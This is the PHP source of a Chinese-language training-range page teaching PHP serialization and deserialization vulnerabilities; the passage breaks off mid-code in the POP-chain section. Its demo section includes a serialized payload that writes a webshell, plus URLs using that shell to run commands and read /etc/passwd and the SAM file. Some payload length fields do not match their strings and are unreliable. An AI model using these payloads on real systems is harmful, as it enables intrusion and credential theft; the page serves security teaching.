<?php
/**
 * HeaSec天积安全团队 - 反序列化基础靶场
 * 版本: v1.0.0
 * 创建日期: 2026-04-11
 * 团队: 天积安全 (HeavenlySecret)
 */

// 设置响应头
header('X-HeavenlySecret: HeaSec 反序列化基础 Range v1.0.0');
header('Content-Type: text/html; charset=utf-8');

// 设置页面变量
$pageTitle = '反序列化基础靶场';
$rangeName = '反序列化基础';
$showVersion = false;
$showResetButton = false;
$version = 'v1.0.0';

// 设置公共组件的基础路径（从靶场目录到range/common/的相对路径）
$commonBasePath = '../../../common/';

// 定义常量允许访问公共组件
define('HEASEC_RANGE_ACCESS', true);

// 引入星星系统组件
require_once $commonBasePath . 'components/star-system/includes/HeaSec_StarSystem.php';

// 引入公共头部
require_once $commonBasePath . 'includes/header.php';
?>

<!-- 引入自定义样式 -->
<link rel="stylesheet" href="./css/style.css">

<!-- 引入星星系统组件的CSS样式 -->
<link rel="stylesheet" href="<?php echo $commonBasePath; ?>components/star-system/css/heasec-congrats-modal.css">

<!-- 靶场主要内容 -->
<div class="heasec-container">

    <!-- 第一章节：什么是序列化与反序列化 -->
    <div class="collapsible-section expanded" id="section1">
        <div class="collapsible-header" onclick="toggleSection('section1')">
            <span class="toggle-text">
                <i class="fa fa-exchange-alt"></i> 什么是序列化与反序列化
            </span>
            <div class="toggle-btn"></div>
        </div>
        <div class="collapsible-content">
            <div class="chapter-title">
                <i class="fa fa-book"></i> 序列化与反序列化的概念
            </div>
            <div class="chapter-description">
                序列化与反序列化是编程中常见的数据处理技术，理解它们是掌握反序列化漏洞的基础。
            </div>

            <div class="code-display-section">
                <h4><i class="fa fa-lightbulb-o"></i> 定义</h4>
                <div class="composition-explanation">
                    <ul>
                        <li><strong>序列化（Serialization）</strong>：将对象、数组等复杂数据结构转换为可存储或传输的字符串格式的过程</li>
                        <li><strong>反序列化（Deserialization）</strong>：将序列化后的字符串还原为原始数据结构（对象、数组等）的过程</li>
                        <li>序列化是跨语言、跨平台数据交换的基础技术</li>
                        <li>在PHP中，<code>serialize()</code>函数用于序列化，<code>unserialize()</code>函数用于反序列化</li>
                    </ul>
                </div>

                <h4 style="margin-top:25px"><i class="fa fa-life-ring"></i> 生活中的类比</h4>
                <div class="analogy-card">
                    <div class="analogy-icon">📦</div>
                    <div>
                        <h5>类比1：快递打包</h5>
                        <p>序列化就像把一件复杂的大件家具拆解、打包成一个可以运输的纸箱；反序列化就像收到纸箱后，按照说明书重新组装成家具</p>
                    </div>
                </div>
                <div class="analogy-card">
                    <div class="analogy-icon">🌐</div>
                    <div>
                        <h5>类比2：翻译官</h5>
                        <p>序列化就像把一篇中文文章翻译成世界通用的英文；反序列化就像把英文翻译回中文，让中文读者能理解</p>
                    </div>
                </div>
                <div class="analogy-card">
                    <div class="analogy-icon">📁</div>
                    <div>
                        <h5>类比3：压缩文件</h5>
                        <p>序列化就像把一个文件夹压缩成zip包便于传输；反序列化就像解压缩还原文件夹</p>
                    </div>
                </div>

                <h4 style="margin-top:25px"><i class="fa fa-cogs"></i> 序列化的应用场景</h4>
                <div class="composition-explanation">
                    <ul>
                        <li><strong>数据持久化</strong>：将对象保存到文件或数据库中，下次使用时恢复</li>
                        <li><strong>Session存储</strong>：PHP默认使用序列化存储Session数据</li>
                        <li><strong>缓存系统</strong>：Memcached、Redis等缓存系统使用序列化存储复杂数据</li>
                        <li><strong>网络传输</strong>：跨进程、跨服务器的数据传输（如API接口）</li>
                        <li><strong>Cookie存储</strong>：部分应用将用户信息序列化后存储在Cookie中</li>
                    </ul>
                </div>

                <div class="security-warning" style="margin-top:20px">
                    <h5><i class="fa fa-exclamation-triangle"></i> 安全警示：反序列化的高风险场景</h5>
                    <p>以下场景在真实漏洞中频繁出现，当这些场景中的序列化数据可被用户控制时，就可能产生反序列化漏洞：</p>
                    <ul>
                        <li><strong>Session反序列化漏洞</strong>：当session.serialize_handler配置不当，攻击者可通过Session注入触发反序列化</li>
                        <li><strong>Cookie反序列化漏洞</strong>：应用将序列化数据存入Cookie且未做签名校验时，攻击者可篡改Cookie</li>
                        <li><strong>数据库/缓存中的序列化数据</strong>：从数据库或Redis读取的序列化数据如果被污染，反序列化时即可触发漏洞</li>
                        <li><strong>框架反序列化</strong>：Laravel、ThinkPHP、Yii等主流框架都曾出现过反序列化RCE漏洞</li>
                    </ul>
                </div>

                <h4 style="margin-top:25px"><i class="fa fa-project-diagram"></i> 工作流程图</h4>
                <div class="flow-container">
                    <div class="flow-row">
                        <div class="flow-box blue">PHP对象/数组</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-box orange"><code>serialize()</code></div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-box purple">序列化字符串</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-box green">存储/传输</div>
                    </div>
                    <div class="flow-arrow-down">↕</div>
                    <div class="flow-row">
                        <div class="flow-box green">文件/数据库/网络</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-box purple">序列化字符串</div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-box orange"><code>unserialize()</code></div>
                        <div class="flow-arrow">→</div>
                        <div class="flow-box blue">PHP对象/数组</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- 第二章节：PHP序列化格式详解 -->
    <div class="collapsible-section" id="section2">
        <div class="collapsible-header" onclick="toggleSection('section2')">
            <span class="toggle-text">
                <i class="fa fa-barcode"></i> PHP序列化格式详解
            </span>
            <div class="toggle-btn"></div>
        </div>
        <div class="collapsible-content">
            <div class="chapter-title">
                <i class="fa fa-code"></i> 序列化字符串的格式规则
            </div>
            <div class="chapter-description">
                PHP序列化后的字符串有固定的格式规则，不同数据类型有不同的标识符。
            </div>

            <div class="code-display-section">
                <h4><i class="fa fa-table"></i> 基本数据类型序列化格式</h4>
                <table class="info-table">
                    <thead>
                        <tr><th>数据类型</th><th>标识符</th><th>格式</th><th>示例值</th><th>序列化结果</th></tr>
                    </thead>
                    <tbody>
                        <tr><td>字符串</td><td><code>s</code></td><td><code>s:长度:"值";</code></td><td><code>"Hello"</code></td><td><code>s:5:"Hello";</code></td></tr>
                        <tr><td>整数</td><td><code>i</code></td><td><code>i:数值;</code></td><td><code>42</code></td><td><code>i:42;</code></td></tr>
                        <tr><td>浮点数</td><td><code>d</code></td><td><code>d:数值;</code></td><td><code>3.14</code></td><td><code>d:3.14;</code></td></tr>
                        <tr><td>布尔值</td><td><code>b</code></td><td><code>b:0/1;</code></td><td><code>true</code></td><td><code>b:1;</code></td></tr>
                        <tr><td>NULL</td><td><code>N</code></td><td><code>N;</code></td><td><code>null</code></td><td><code>N;</code></td></tr>
                    </tbody>
                </table>

                <h4 style="margin-top:25px"><i class="fa fa-layer-group"></i> 复合数据类型</h4>

                <h5 style="color:#2d3748;margin:15px 0 8px">数组（Array）</h5>
                <p style="color:#718096;font-size:14px">格式：<code>a:元素个数:{键;值;键;值;...}</code></p>
                <pre class="static-code-block"><code><span class="comment">// PHP代码</span>
<span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">"name"</span> => <span class="string">"admin"</span>, <span class="string">"age"</span> => <span class="number">25</span>, <span class="string">"role"</span> => <span class="string">"user"</span>);

<span class="comment">// 序列化结果（色块高亮）</span>
<span class="attr-name">a:3:{</span><span class="keyword">s:4:"name";</span><span class="string">s:5:"admin";</span><span class="keyword">s:3:"age";</span><span class="number">i:25;</span><span class="keyword">s:4:"role";</span><span class="string">s:4:"user";</span><span class="attr-name">}</span></code></pre>

                <h5 style="color:#2d3748;margin:15px 0 8px">对象（Object）</h5>
                <p style="color:#718096;font-size:14px">格式：<code>O:类名长度:"类名":属性个数:{属性名;属性值;...}</code></p>
                <pre class="static-code-block"><code><span class="keyword">class</span> <span class="type">User</span> {
    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">"admin"</span>;
    <span class="keyword">public</span> <span class="variable">$role</span> = <span class="string">"user"</span>;
    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">"secret"</span>;
    <span class="keyword">protected</span> <span class="variable">$email</span> = <span class="string">"admin@test.com"</span>;
}

<span class="comment">// 序列化结果</span>
<span class="type">O:4:"User":4:{</span><span class="keyword">s:4:"name";</span><span class="string">s:5:"admin";</span><span class="keyword">s:4:"role";</span><span class="string">s:4:"user";</span>
<span class="keyword">s:14:"Userpassword";</span><span class="string">s:6:"secret";</span><span class="keyword">s:8:"*email";</span><span class="string">s:14:"admin@test.com";</span><span class="type">}</span></code></pre>

                <h4 style="margin-top:25px"><i class="fa fa-key"></i> 访问修饰符对序列化的影响</h4>
                <table class="info-table">
                    <thead>
                        <tr><th>修饰符</th><th>属性序列化格式</th><th>示例</th><th>说明</th></tr>
                    </thead>
                    <tbody>
                        <tr><td><code>public</code></td><td>属性名</td><td><code>name</code></td><td>直接使用属性名</td></tr>
                        <tr><td><code>private</code></td><td><code>\0类名\0属性名</code></td><td><code>\0User\0password</code></td><td>前后添加\0和类名，长度包含\0</td></tr>
                        <tr><td><code>protected</code></td><td><code>\0*\0属性名</code></td><td><code>\0*\0email</code></td><td>前添加\0*\0，长度包含\0</td></tr>
                    </tbody>
                </table>

                <div class="security-warning">
                    <h5><i class="fa fa-shield"></i> 安全提示</h5>
                    <p>private和protected属性在序列化字符串中包含不可见字符<code>\0</code>，在手动构造序列化字符串时需要特别注意。</p>
                </div>
            </div>
        </div>
    </div>

    <!-- 第三章节：PHP序列化交互练习 -->
    <div class="collapsible-section" id="section3">
        <div class="collapsible-header" onclick="toggleSection('section3')">
            <span class="toggle-text">
                <i class="fa fa-play-circle"></i> PHP序列化交互练习
            </span>
            <div class="toggle-btn"></div>
        </div>
        <div class="collapsible-content">
            <div class="chapter-title">
                <i class="fa fa-flask"></i> 动手体验序列化与反序列化
            </div>
            <div class="chapter-description">
                通过交互式操作实践序列化与反序列化过程，直观感受数据格式的变化。
            </div>

            <!-- 序列化练习区域 -->
            <div class="interactive-area">
                <h4><i class="fa fa-arrow-right"></i> 序列化练习</h4>

                <div class="quick-examples">
                    <span style="color:#718096;font-size:13px;line-height:32px">快速示例：</span>
                    <button class="quick-example-btn" onclick="quickFillExample('string')">字符串</button>
                    <button class="quick-example-btn" onclick="quickFillExample('integer')">整数</button>
                    <button class="quick-example-btn" onclick="quickFillExample('float')">浮点数</button>
                    <button class="quick-example-btn" onclick="quickFillExample('boolean')">布尔值</button>
                </div>

                <div class="dual-column-layout">
                    <div class="column">
                        <h5><i class="fa fa-edit"></i> 输入</h5>
                        <div class="form-group">
                            <label>数据类型</label>
                            <select id="serializeType" class="form-control" onchange="updateSerializeForm()">
                                <option value="string">字符串</option>
                                <option value="integer">整数</option>
                                <option value="float">浮点数</option>
                                <option value="boolean">布尔值</option>
                                <option value="null">NULL</option>
                                <option value="assoc_array">数组（关联数组）</option>
                                <option value="index_array">数组（索引数组）</option>
                                <option value="object">对象</option>
                            </select>
                        </div>
                        <div id="serializeFormFields"></div>
                        <button class="btn btn-primary" onclick="doSerialize()">
                            <i class="fa fa-play"></i> 序列化
                        </button>
                    </div>
                    <div class="column">
                        <h5><i class="fa fa-file-code-o"></i> 序列化结果</h5>
                        <div id="serializeOutput" class="output-box">
                            <span style="color:#718096">点击"序列化"按钮查看结果</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- 反序列化练习区域 -->
            <div class="interactive-area" style="margin-top:20px">
                <h4><i class="fa fa-arrow-left"></i> 反序列化练习</h4>
                <div class="form-group">
                    <label>序列化字符串</label>
                    <textarea id="unserializeInput" class="form-control" placeholder="输入序列化字符串进行反序列化练习" style="height:120px"></textarea>
                </div>
                <div class="btn-group">
                    <button class="btn btn-primary" onclick="doUnserialize()">
                        <i class="fa fa-play"></i> 反序列化
                    </button>
                    <button class="btn btn-secondary" onclick="loadUnserializeExample()">
                        <i class="fa fa-file-text"></i> 加载示例
                    </button>
                </div>
                <div style="margin-top:15px">
                    <h5 style="color:#2d3748;font-size:14px;margin-bottom:8px"><i class="fa fa-eye"></i> 反序列化结果</h5>
                    <div id="unserializeOutput" class="output-box">
                        <span style="color:#718096">点击"反序列化"按钮查看结果</span>
                    </div>
                </div>
            </div>

            <!-- 格式解读区域 -->
            <div id="formatInterpretation" class="format-interpretation" style="display:none">
                <div class="fmt-panel-header">
                    <h5><i class="fa fa-search"></i> 格式解读</h5>
                    <div class="fmt-view-switcher" style="display:none">
                        <button class="fmt-view-btn active" data-mode="tree" onclick="switchFormatView('tree')"><i class="fa fa-sitemap"></i> 树形</button>
                        <button class="fmt-view-btn" data-mode="linear" onclick="switchFormatView('linear')"><i class="fa fa-stream"></i> 线性</button>
                    </div>
                </div>
                <div class="fmt-panel-body">
                    <p style="color:#718096">进行序列化/反序列化操作后，此处将自动显示格式解读</p>
                </div>
            </div>
        </div>
    </div>

    <!-- 第四章节：PHP魔术方法与反序列化漏洞 -->
    <div class="collapsible-section" id="section4">
        <div class="collapsible-header" onclick="toggleSection('section4')">
            <span class="toggle-text">
                <i class="fa fa-magic"></i> PHP魔术方法与反序列化漏洞
            </span>
            <div class="toggle-btn"></div>
        </div>
        <div class="collapsible-content">
            <div class="chapter-title">
                <i class="fa fa-hat-wizard"></i> 理解魔术方法的触发机制
            </div>
            <div class="chapter-description">
                PHP魔术方法在特定条件下会被自动调用，它们是反序列化漏洞的关键触发点。
            </div>

            <div class="code-display-section">
                <div class="security-warning" style="margin-top:0;margin-bottom:20px">
                    <h5><i class="fa fa-exclamation-triangle"></i> 真实案例警示</h5>
                    <p>反序列化漏洞不是理论问题——它是现实中造成严重后果的高危漏洞：</p>
                    <table class="info-table" style="margin-top:10px">
                        <thead><tr><th>漏洞编号</th><th>影响产品</th><th>危害</th></tr></thead>
                        <tbody>
                            <tr><td>CVE-2018-14858</td><td>Joomla! 3.0~3.8.8</td><td>远程代码执行（RCE）</td></tr>
                            <tr><td>SA-CORE-2018-002</td><td>Drupal 7.x/8.x</td><td>远程代码执行（RCE）</td></tr>
                            <tr><td>CVE-2021-3129</td><td>Laravel &lt;= 8.4.2</td><td>远程代码执行（RCE）</td></tr>
                        </tbody>
                    </table>
                </div>

                <h4><i class="fa fa-star"></i> 什么是魔术方法</h4>
                <div class="composition-explanation">
                    <ul>
                        <li>魔术方法是PHP中以<code>__</code>（双下划线）开头的特殊方法</li>
                        <li>在特定条件下会被PHP自动调用，无需手动调用</li>
                        <li>在反序列化漏洞中，攻击者通过控制对象的属性值来影响魔术方法的行为</li>
                    </ul>
                </div>

                <h4 style="margin-top:20px"><i class="fa fa-table"></i> 常见魔术方法一览表</h4>
                <table class="info-table">
                    <thead>
                        <tr><th>魔术方法</th><th>触发时机</th><th>在反序列化中的作用</th><th>危险等级</th></tr>
                    </thead>
                    <tbody>
                        <tr><td><code>__construct()</code></td><td>对象创建时</td><td>unserialize()时<strong>不会</strong>被调用</td><td style="color:#95a5a6">⚪ 无</td></tr>
                        <tr><td><code>__destruct()</code></td><td>对象销毁时</td><td>脚本结束或对象销毁时自动调用</td><td style="color:#e74c3c">🔴 高</td></tr>
                        <tr><td><code>__wakeup()</code></td><td>反序列化时</td><td>unserialize()时自动调用</td><td style="color:#e74c3c">🔴 高</td></tr>
                        <tr><td><code>__toString()</code></td><td>对象被当作字符串使用时</td><td>echo/print时自动调用</td><td style="color:#e67e22">🟡 中</td></tr>
                        <tr><td><code>__call()</code></td><td>调用不存在的方法时</td><td>调用不可访问方法时自动调用</td><td style="color:#e67e22">🟡 中</td></tr>
                        <tr><td><code>__invoke()</code></td><td>对象被当作函数调用时</td><td>$obj()时自动调用</td><td style="color:#e74c3c">🔴 高</td></tr>
                        <tr><td><code>__sleep()</code></td><td>序列化时</td><td>serialize()时自动调用</td><td style="color:#95a5a6">⚪ 无</td></tr>
                    </tbody>
                </table>

                <h4 style="margin-top:20px"><i class="fa fa-sort-amount-down"></i> 魔术方法调用顺序</h4>
                <div class="flow-container">
                    <div class="flow-box blue"><code>unserialize()</code> 被调用</div>
                    <div class="flow-arrow-down">↓</div>
                    <div class="flow-box green"><code>__wakeup()</code> 被调用（如果存在）</div>
                    <div class="flow-arrow-down">↓</div>
                    <div class="flow-box purple">对象创建完成，可以正常使用</div>
                    <div class="flow-arrow-down">↓</div>
                    <div class="flow-box orange">脚本结束 / 对象销毁</div>
                    <div class="flow-arrow-down">↓</div>
                    <div class="flow-box red"><code>__destruct()</code> 被调用（如果存在）</div>
                </div>

                <h4 style="margin-top:20px"><i class="fa fa-bug"></i> 漏洞产生示例</h4>
                <pre class="static-code-block"><code><span class="keyword">class</span> <span class="type">Logger</span> {
    <span class="keyword">public</span> <span class="variable">$logFile</span> = <span class="string">'app.log'</span>;
    <span class="keyword">public</span> <span class="variable">$logData</span> = <span class="string">''</span>;

    <span class="keyword">public function</span> <span class="func">__destruct</span>() {
        <span class="comment">// 对象销毁时将日志数据写入文件</span>
        <span class="func">file_put_contents</span>(<span class="variable">$this</span>->logFile, <span class="variable">$this</span>->logData);
    }
}

<span class="comment">// 🔴 危险代码：直接将用户输入传递给unserialize()</span>
<span class="variable">$data</span> = <span class="func">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">'data'</span>]);</code></pre>

                <table class="info-table" style="margin-top:15px">
                    <thead><tr><th>步骤</th><th>代码行为</th><th>安全问题</th></tr></thead>
                    <tbody>
                        <tr><td>①</td><td>攻击者构造恶意序列化字符串</td><td>攻击者完全控制输入数据</td></tr>
                        <tr><td>②</td><td>$_GET['data']传入unserialize()</td><td>用户输入未经验证直接进入危险函数</td></tr>
                        <tr><td>③</td><td>PHP创建Logger对象，属性值由攻击者指定</td><td>$logFile和$logData被篡改为恶意值</td></tr>
                        <tr><td>④</td><td>脚本结束时__destruct()自动触发</td><td>魔术方法无需手动调用，自动执行</td></tr>
                        <tr><td>⑤</td><td>file_put_contents()写入攻击者指定的路径</td><td>任意文件写入 → 可进一步导致RCE</td></tr>
                    </tbody>
                </table>

                <div class="example-explanation" style="margin-top:15px">
                    <h5><i class="fa fa-lightbulb-o"></i> 关键理解</h5>
                    <p style="color:#4a5568">反序列化漏洞的本质不是<code>unserialize()</code>函数本身有问题，而是<strong>反序列化后的对象在魔术方法中使用了不受信任的属性值执行了敏感操作</strong>。</p>
                </div>
            </div>

            <!-- 漏洞实战演示 -->
            <div class="vuln-demo-section">
                <h4><i class="fa fa-crosshairs"></i> 实战演示：从Payload到漏洞触发</h4>

                <!-- Part 1: 漏洞代码回顾 -->
                <div class="vuln-code-review">
                    <div class="vuln-code-label">存在漏洞的 Logger 类（回顾第三章节）</div>
                    <pre><code><span class="ser-keyword">class</span> <span class="ser-identifier">Logger</span> {
    <span class="ser-keyword">public</span> $logFile = <span class="ser-value">'app.log'</span>;
    <span class="ser-keyword">public</span> $logData = <span class="ser-value">''</span>;

    <span class="ser-keyword">function</span> <span class="ser-identifier" style="color:#e74c3c">__destruct</span>() {
        <span class="ser-keyword">file_put_contents</span>(<span class="vuln-step-highlight">$this->logFile</span>, <span class="vuln-step-highlight">$this->logData</span>);
    }
}</code></pre>
                    <p style="color:#e74c3c;font-size:13px;margin-top:8px">
                        <i class="fa fa-exclamation-triangle"></i> 危险点：<code>$this->logFile</code> 和 <code>$this->logData</code> 来自对象属性，反序列化时由攻击者完全控制
                    </p>
                </div>

                <!-- Part 2: 攻击Payload展示 -->
                <div class="vuln-payload-display">
                    <div class="vuln-payload-label">攻击 Payload 字符串</div>
                    <div class="vuln-payload-string">
                        <span class="vuln-payload-seg seg-type-id">O:</span><span class="vuln-payload-seg seg-number">6</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val">Logger</span><span class="vuln-payload-seg seg-separator">":</span><span class="vuln-payload-seg seg-number">2</span><span class="vuln-payload-seg seg-brace">:{</span><span class="vuln-payload-seg seg-type-id">s:</span><span class="vuln-payload-seg seg-number">7</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val">logFile</span><span class="vuln-payload-seg seg-separator">";</span><span class="vuln-payload-seg seg-type-id">s:</span><span class="vuln-payload-seg seg-number">15</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val vuln-danger-text">./uploads/shell.php</span><span class="vuln-payload-seg seg-separator">";</span><span class="vuln-payload-seg seg-type-id">s:</span><span class="vuln-payload-seg seg-number">7</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val">logData</span><span class="vuln-payload-seg seg-separator">";</span><span class="vuln-payload-seg seg-type-id">s:</span><span class="vuln-payload-seg seg-number">27</span><span class="vuln-payload-seg seg-separator">:"</span><span class="vuln-payload-seg seg-string-val vuln-danger-text">&lt;?php system($_GET[c]);?&gt;</span><span class="vuln-payload-seg seg-separator">";</span><span class="vuln-payload-seg seg-brace">}</span>
                    </div>
                    <div class="vuln-payload-legend">
                        <span class="legend-item"><i class="fa fa-circle" style="color:#3b82f6;font-size:10px"></i> 类型标识</span>
                        <span class="legend-item"><i class="fa fa-circle" style="color:#f59e0b;font-size:10px"></i> 长度/数量</span>
                        <span class="legend-item"><i class="fa fa-circle" style="color:#22c55e;font-size:10px"></i> 字符串值</span>
                        <span class="legend-item"><i class="fa fa-circle" style="color:#9ca3af;font-size:10px"></i> 分隔符</span>
                        <span class="legend-item"><i class="fa fa-circle" style="color:#ef4444;font-size:10px"></i> 攻击者控制的值</span>
                    </div>
                    <p style="color:#6b7280;font-size:13px;margin-top:8px">
                        <i class="fa fa-target"></i> 目标：向 <code>./uploads/shell.php</code> 写入一句话木马，后续可通过浏览器访问执行任意命令
                    </p>
                </div>

                <!-- Part 3: 逐步执行追踪 -->
                <div class="vuln-trace-container">

                    <!-- 步骤1: 发送Payload -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-entry">1</div>
                        <div class="vuln-step-content step-entry-step">
                            <h5>攻击者发送 Payload</h5>
                            <p>攻击者将构造好的序列化字符串通过可控入口传入服务器：</p>
                            <div class="vuln-step-code">// 通过 GET 参数
?data=O:6:"Logger":2:{...}

// 或通过 POST / Cookie
$_POST['data'] = 'O:6:"Logger":2:{...}'
$_COOKIE['data'] = 'O:6:"Logger":2:{...}'</div>
                            <p style="font-size:12px;color:#9ca3af;margin-top:5px">只要数据能到达 <code>unserialize()</code> 函数，任何输入渠道都可以利用</p>
                        </div>
                    </div>

                    <!-- 步骤2: unserialize解析 -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-entry">2</div>
                        <div class="vuln-step-content step-entry-step">
                            <h5>PHP 解析序列化字符串</h5>
                            <p>PHP 的 <code>unserialize()</code> 函数逐字符读取并解析 payload：</p>
                            <div class="vuln-step-code">O:6:"Logger":2:{...}
│ │    │       │   └─ 属性数量: 2个
│ │    │       └─ 类名: "Logger"
│ │    └─ 类名长度: 6
│ └─ 类型: Object
└─ 开始解析对象...</div>
                            <p>PHP 根据格式规范，识别出这是一个 <strong>Object</strong> 类型，类名为 <code>"Logger"</code>，包含 <strong>2 个属性</strong></p>
                        </div>
                    </div>

                    <!-- 步骤3: 属性赋值 -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-middle">3</div>
                        <div class="vuln-step-content step-middle-step">
                            <h5>对象属性被赋值为攻击者指定的值</h5>
                            <p>PHP 继续解析属性部分，将 payload 中的值直接写入对象属性：</p>
                            <div class="vuln-step-code">$logger->logFile = <span class="vuln-step-highlight">"./uploads/shell.php"</span>;   // 原始值: "app.log"
$logger->logData  = <span class="vuln-step-highlight">&lt;?php system($_GET[c]);?&gt;</span>; // 原始值: ""</div>
                            <p><i class="fa fa-exclamation-circle" style="color:#f59e0b"></i> <strong>关键：</strong>属性值完全来自 payload 字符串，没有任何过滤或校验！</p>
                        </div>
                    </div>

                    <!-- 步骤4: 触发__destruct -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-middle">4</div>
                        <div class="vuln-step-content step-middle-step">
                            <h5>脚本结束，自动触发 __destruct()</h5>
                            <p>当 PHP 脚本执行完毕或对象被销毁时，<strong>自动调用魔术方法</strong> <code>__destruct()</code>：</p>
                            <div class="vuln-step-code">// PHP 内部自动执行（无需攻击者手动调用）
$logger->__destruct();  // ← 自动触发！

// 等价于执行：
file_put_contents($this->logFile, $this->logData);</div>
                            <p><i class="fa fa-magic" style="color:#f59e0b"></i> 魔术方法的特点：<strong>在特定时机自动执行</strong>，攻击者不需要直接调用它</p>
                        </div>
                    </div>

                    <!-- 步骤5: 执行危险操作 -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-danger">5</div>
                        <div class="vuln-step-content step-danger-step">
                            <h5>file_put_contents() 以恶意参数执行</h5>
                            <p><code>__destruct()</code> 内部的危险函数被调用，参数全部来自被篡改的对象属性：</p>
                            <div class="vuln-step-code"><span class="ser-keyword">file_put_contents</span>(
    <span class="vuln-step-highlight">"./uploads/shell.php"</span>,     ← $this->logFile（攻击者控制）
    <span class="vuln-step-highlight">&lt;?php system($_GET[c]);?&gt;</span>  ← $this->logData（攻击者控制）
);</div>
                            <p style="color:#ef4444;font-weight:600"><i class="fa fa-skull"></i> 文件写入函数以攻击者指定的路径和内容执行了！</p>
                        </div>
                    </div>

                    <!-- 步骤6: 漏洞达成 -->
                    <div class="vuln-step">
                        <div class="vuln-step-number step-danger">6</div>
                        <div class="vuln-step-content step-danger-step">
                            <h5>漏洞达成 — 获取服务器权限</h5>
                            <p>恶意文件已成功写入服务器，攻击者可以通过浏览器访问：</p>
                            <div class="vuln-step-code"># 访问写入的 Webshell
http://target.com/uploads/shell.php?c=whoami

# 输出: desktop-admin（当前系统用户名）

# 进一步利用
http://target.com/uploads/shell.php?c=cat /etc/passwd
http://target.com/uploads/shell.php?c=dir C:\
http://target.com/uploads/shell.php?c=type C:\windows\system32\config\SAM</div>
                            <p style="color:#ef4444;font-weight:600;font-size:14px">
                                <i class="fa fa-check-circle"></i> <strong>RCE（远程代码执行）达成！</strong>攻击者已获得在服务器上执行任意命令的能力
                            </p>
                        </div>
                    </div>

                </div><!-- /vuln-trace-container -->

                <!-- Part 4: 总结 -->
                <div class="example-explanation" style="background:linear-gradient(135deg,#fef3c7,#fde68a);border-left:4px solid #f59e0b">
                    <h5 style="color:#92400e"><i class="fa fa-lightbulb-o"></i> 关键理解总结</h5>
                    <p style="color:#78350f">通过上面的完整追踪过程，我们可以清晰地看到反序列化漏洞的数据流路径：</p>
                    <div style="background:rgba(255,255,255,0.6);padding:12px;border-radius:8px;margin:10px 0;text-align:center;font-size:15px">
                        <strong style="color:#3b82f6">攻击者构造的Payload</strong>
                        <i class="fa fa-arrow-right" style="margin:0 12px;color:#6b7280"></i>
                        <strong style="color:#f59e0b">unserialize()解析 → 属性被篡改</strong>
                        <i class="fa fa-arrow-right" style="margin:0 12px;color:#6b7280"></i>
                        <strong style="color:#f59e0b">__destruct()自动触发</strong>
                        <i class="fa fa-arrow-right" style="margin:0 12px;color:#6b7280"></i>
                        <strong style="color:#ef4444">危险函数执行恶意操作</strong>
                    </div>
                    <p style="color:#78350f;font-size:13px">漏洞的本质是：<strong>不受信任的数据 → 对象属性 → 魔术方法 → 敏感操作</strong> 这条链路上的每一步都缺乏有效的安全检查。防御的核心思路就是在这条链路的任意环节进行拦截。</p>
                </div>

            </div><!-- /vuln-demo-section -->

        </div>
    </div>

    <!-- 第五章节：反序列化漏洞利用流程 -->
    <div class="collapsible-section" id="section5">
        <div class="collapsible-header" onclick="toggleSection('section5')">
            <span class="toggle-text">
                <i class="fa fa-bug"></i> 反序列化漏洞利用流程
            </span>
            <div class="toggle-btn"></div>
        </div>
        <div class="collapsible-content">
            <div class="chapter-title">
                <i class="fa fa-route"></i> 漏洞利用三要素与POP链
            </div>
            <div class="chapter-description">
                理解反序列化漏洞的利用过程，掌握POP链的概念和构造方法。
            </div>

            <div class="code-display-section">
                <h4><i class="fa fa-th-large"></i> 漏洞利用三要素</h4>
                <div class="three-factors">
                    <div class="factor-card sink">
                        <i class="fa fa-door-open"></i>
                        <h5>入口点（Sink）</h5>
                        <p>找到使用<code>unserialize()</code>且参数可控的位置。常见入口：Cookie、请求参数、文件读取内容</p>
                    </div>
                    <div class="factor-card chain">
                        <i class="fa fa-link"></i>
                        <h5>利用链（Gadget Chain）</h5>
                        <p>从入口点到危险操作的调用路径，通过魔术方法串联多个类的方法</p>
                    </div>
                    <div class="factor-card danger">
                        <i class="fa fa-skull-crossbones"></i>
                        <h5>危险操作（Danger）</h5>
                        <p>最终达到的恶意目的：命令执行、文件读写、代码执行等</p>
                    </div>
                </div>

                <h4 style="margin-top:25px"><i class="fa fa-link"></i> POP链（Property-Oriented Programming）</h4>
                <div class="composition-explanation">
                    <p>POP链是反序列化漏洞利用的核心技术。通过精心构造对象的属性值，将多个类的魔术方法串联起来，形成一条从反序列化入口到危险操作的调用链。</p>
                    <p style="margin-top:8px">类似于"多米诺骨牌"效应——推倒第一块（触发反序列化），后续的每块骨牌（魔术方法调用）依次倒下，最终达到目标。</p>
                </div>

                <h4 style="margin-top:20px"><i class="fa fa-project-diagram"></i> POP链构造示例</h4>
                <pre class="static-code-block"><code><span class="comment">// 第一个类：入口点</span>
<span class="keyword">class</span> <span class="type">CacheHandler</span> {
    <span class="keyword">public</span> <span class="variable">$cache</span>;

    <span class="keyword">public function</span> <span class="func">__destruct</span>() {
        <span class="variable">$this</span>->cache-><span class="func">clean</span>();
    }
}

<span class="comment">// 第二个类：中间跳板</span>
<span class="keyword">class</span> <span class="type">TemplateEngine</span> {
    <span class="keyword">public</span> <span class="variable">$templateDir</span>;
    <span class="keyword">public</span> <span class="variable">$file</span>;

    <span class="keyword">public function</span> <span class="func">clean</span>() {
        <span class="variable">$this</span>->file-><span class="func">delete</span>(<span class="variable">$this</span>->templateDir);
    }
}

<span class="comment">// 第三个类：危险操作</span>
<span class="keyword">class</span> <span class="type">FileManager</span> {
